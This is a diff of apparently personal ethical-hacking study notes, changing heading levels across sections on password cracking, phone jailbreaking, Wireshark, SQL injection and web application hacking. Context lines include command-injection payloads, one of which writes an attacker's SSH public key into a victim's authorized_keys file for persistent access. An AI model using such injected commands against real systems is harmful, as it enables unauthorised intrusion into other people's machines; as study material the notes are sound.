@@ -1537,7 +1537,7 @@ Hashcalc
 Rainbow Crack
 netcat+
 
-### Password Cracking Countermeasures
+# Password Cracking Countermeasures
 
 Change default password
 Do not store/save passwords in applications
@@ -1572,7 +1572,7 @@ SSH Login - SSH username@10.10.10.10
 
 
 
-### Android Iphone Hacking:
+# Android Iphone Hacking:
 
 Types of jailbreaking tools
 
@@ -1618,7 +1618,7 @@ ls
  <            android location   >                      <pc location>
 
 
-### WiFi LTE RADIO Hacking:
+# WiFi LTE RADIO Hacking:
 
 Zigbee - Protocol based on the IEEE 203.15.4 standard; - Range of 10-100 m. - Designed for small-scale projects which need wireless connection.
 
@@ -1667,7 +1667,7 @@ SOAP is the Simple Object Access Protocol
 
 SOAP uses an XML data format
 
-### WireShark
+# WireShark
 
 Filter examples:
 
@@ -1691,7 +1691,7 @@ IPsec suite:
 · Security Association (SA)
 · IKE - IKEv1 or IKEv2, depending on the version) is the protocol used to set up a security association (SA) in the IPsec protocol suite. IKE builds upon the Oakley protocol and ISAKMP. IKE uses X.509 certificates for authentication 
 
-### SQL hacking and examples
+# SQL hacking and examples
 
 
  Boolean-Based Blind SQL Injection:
@@ -1745,7 +1745,7 @@ command injection
 just use ; and type your command
 ; cd ~ && pwd
 
-### Web applicaiton hacking:
+# Web applicaiton hacking:
 
 Generate SSH Key Pair:
 cd ~/.ssh/id_rsa
@@ -1760,7 +1760,7 @@ inject your SSH key to victim device(FYI - SSL key has been modified):
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCW+gcpi9WfUm1gwtYghmIwnLf1rkca1ZRdgfgdfjjkjkEFDeXXh1eV0prP1cOsUmAmfJl/GBwiGyRo79gkmHE5p0gyH3SlSfIXkI/PDz/E9PNIu/lDBLWNjT8ELJF2GgDU2GiuNh5ryK9zlTiEmvpI5/Nre/K1yliqsCzr5SLWRREQ2uQv8fb6z47YnTOVb09DlOr8HIiXTnQznNaQGeuKkud9K/c9kFojFK9aJgi60XHNUcgbQv9AZZhG2pzFt4cgo/hHv17Zv762Sc33kd+33boIXmKk4+iFYKAH6BkL1kIDnCCV3CB32yKEufcoUBeTDgPu9XkbeHb3VHN8BzuSXXjYHI+vrrj+qj6CsH8atiiTQBG8pGnZYhh2AWvR7pGF3Lydp0k0fcYlVyKuCxZU6RNs7jITJKwG2Uju9sfDHG4GXL8+HkRYQjS+v2Nx1seyR0dyTqAf0BOwEoSlfWLcgzdu/GhrKedyKM9gx/xcU= uggy@kali" > ./authorized_keys
 
 
-#SSRF
+# SSRF
 
 the application contains an open redirection vulnerability in which the following URL:
 
